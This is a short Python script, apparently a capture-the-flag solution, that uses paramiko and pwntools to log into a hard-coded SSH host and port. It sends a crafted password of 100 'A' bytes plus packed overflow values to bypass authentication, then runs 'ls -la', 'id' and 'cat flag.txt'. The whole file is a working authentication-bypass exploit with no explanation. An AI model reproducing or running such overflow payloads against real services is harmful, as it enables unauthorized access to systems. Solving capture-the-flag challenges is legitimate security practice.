import paramiko
from pwn import *

context.log_level = 'debug'

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)

passwd = b'A'*100
passwd += p32(0xADC29EC3)
passwd += p16(0xBEC2)
passwd += p16(0xAFC3)
passwd += b'\x00'

cli.connect('34.185.222.215', port=31209, username='sshuser', password=passwd)
stdin, stdout, stderr = cli.exec_command('ls -la')
lines = stdout.readlines()
print(''.join(lines))

stdin, stdout, stderr = cli.exec_command('id')
lines = stdout.readlines()
print(''.join(lines))

stdin, stdout, stderr = cli.exec_command('cat flag.txt')
lines = stdout.readlines()
print(''.join(lines))

cli.close()
